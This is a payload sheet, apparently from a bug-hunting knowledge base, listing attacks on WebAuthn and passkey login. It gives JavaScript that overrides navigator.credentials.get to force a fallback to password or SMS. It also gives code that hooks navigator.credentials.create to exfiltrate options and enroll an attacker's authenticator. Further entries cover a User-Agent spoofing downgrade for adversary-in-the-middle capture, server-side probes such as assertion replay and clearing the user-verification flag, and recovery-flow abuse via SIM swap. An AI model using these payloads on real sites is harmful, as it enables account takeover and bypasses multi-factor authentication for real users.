---
title: "Payloads: WebAuthn / Passkey Attacks"
type: payloads
tags: [payloads, authentication, webauthn, passkey, mfa]
sources: []
date_created: 2026-06-17
date_updated: 2026-06-17
---

# Payloads: WebAuthn / Passkey Attacks

Routed via the `hunt-auth` skill. See [[passkey-webauthn-attacks]].

## Force fallback by neutralising the ceremony (XSS / malicious extension on RP origin)
```javascript
navigator.credentials.get = () => Promise.reject(new DOMException('NotAllowedError'));
navigator.credentials.get = () => Promise.resolve(null);   // some flows then offer password
```

## Hijack registration to enroll an attacker authenticator
```javascript
const orig = navigator.credentials.create.bind(navigator.credentials);
navigator.credentials.create = async (opts) => { exfil(opts); return attackerCredential; };
```

## AitM downgrade (proxy rewrites UA so RP disables passkeys)
```
User-Agent: ...Safari/605   # spoof "unsupported" browser -> RP offers SMS/OTP/password -> capture
```

## Server-side logic probes
```
# broken user/session binding: replay another account's assertion against your session
# user-verification bypass: send authenticatorData with the UV flag cleared (0) where UV is required
# challenge reuse: resubmit a prior challenge (test single-use + expiry)
# missing origin/RP-ID check: present an assertion captured from a different origin
```

## Recovery-flow abuse
```
# trigger "lost device" -> complete via weaker channel (email link, KBA, SMS+SIM swap) -> enroll new passkey
```
